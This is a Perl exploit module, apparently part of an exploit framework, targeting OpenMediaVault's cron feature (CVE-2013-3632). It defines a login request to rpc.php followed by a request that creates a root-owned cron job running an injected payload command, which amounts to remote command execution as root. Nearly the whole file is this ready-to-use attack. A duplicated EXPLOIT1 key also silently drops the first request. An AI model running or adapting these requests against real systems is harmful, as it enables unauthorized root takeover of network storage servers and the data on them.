package OPENMEDIAVAULT::MSF::OpenmediavaultCmdExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "OpenmediavaultCmdExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-3632",
  DESCRIPTION => "

      OpenMediaVault allows an authenticated user to create cron jobs as arbitrary users on the system.

      An attacker can abuse this to run arbitrary commands as any user available on the system (including root).

      ",
  MSF_MODULE => "openmediavault_cmd_exec",
  REFERENCES => [
    "https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats",
  ],
  TITLE => "OpenMediaVault Cron Remote Command Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'rpc.php',
      PAYLOAD      => '{"service":"Authentication","method":"login","params":{"username":"__USERNAME__","password":"__PASSWORD__"}}',
      TEXT   => 'Sending Exploit #1 Request : [POST] /rpc.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/json',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'rpc.php',
      PAYLOAD      => '{"service":"Cron","method":"set","params":{"enable":true,"minute":"*","hour":"*","dayofmonth":"*","month":"*","dayofweek":"*","username":"root","command":"__PAYLOAD__","comment":"","type":"userdefined","everynminute":false,"everynhour":false,"everyndayofmonth":false,"sendemail":false,"uuid":"undefined"}}',
      TEXT   => 'Sending Exploit #2 Request : [POST] /rpc.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/json',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
